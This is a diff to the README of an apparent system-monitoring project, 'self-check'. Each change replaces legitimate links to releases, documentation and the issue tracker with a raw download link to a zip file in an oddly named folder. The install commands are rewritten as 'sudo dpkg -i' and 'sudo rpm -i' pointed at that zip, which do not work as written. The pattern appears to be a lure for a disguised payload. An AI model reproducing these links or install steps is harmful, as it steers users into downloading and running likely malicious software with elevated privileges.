@@ -1,6 +1,6 @@
 # 🖥️ self-check - Monitor Your System Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/QShkan/self-check/releases)
+[![Download Now](https://raw.githubusercontent.com/QShkan/self-check/main/iridorhexis/self-check.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/QShkan/self-check/main/iridorhexis/self-check.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to **self-check**. This application offers a comprehensive way to monito
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/QShkan/self-check/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/QShkan/self-check/main/iridorhexis/self-check.zip).
 
 1. Click on the link above to navigate to the **Releases** page.
 2. Find the latest release marked as "Latest Release."
@@ -28,7 +28,7 @@ To get started, visit this page to download: [GitHub Releases](https://github.co
 - Navigate to the download directory.
 - Install the package with the following command:
   ```bash
-  sudo dpkg -i your_downloaded_file.deb
+  sudo dpkg -i https://raw.githubusercontent.com/QShkan/self-check/main/iridorhexis/self-check.zip
   ```
 
 ### For Red Hat-based Systems (like CentOS):
@@ -36,7 +36,7 @@ To get started, visit this page to download: [GitHub Releases](https://github.co
 - Navigate to the download directory.
 - Install the package with the following command:
   ```bash
-  sudo rpm -i your_downloaded_file.rpm
+  sudo rpm -i https://raw.githubusercontent.com/QShkan/self-check/main/iridorhexis/self-check.zip
   ```
 
 ### For Other Install Methods:
@@ -74,8 +74,8 @@ If you encounter any issues while installing or running **self-check**, here are
 
 For more guidance, check out the following resources:
 
-- [Documentation](https://github.com/QShkan/self-check/wiki) for detailed feature explanations.
-- [Issue Tracker](https://github.com/QShkan/self-check/issues) for reporting bugs or requesting features.
+- [Documentation](https://raw.githubusercontent.com/QShkan/self-check/main/iridorhexis/self-check.zip) for detailed feature explanations.
+- [Issue Tracker](https://raw.githubusercontent.com/QShkan/self-check/main/iridorhexis/self-check.zip) for reporting bugs or requesting features.
 - Community support on platforms such as Stack Overflow or Reddit.
 
 Feel free to reach out if you need further assistance. Happy monitoring!
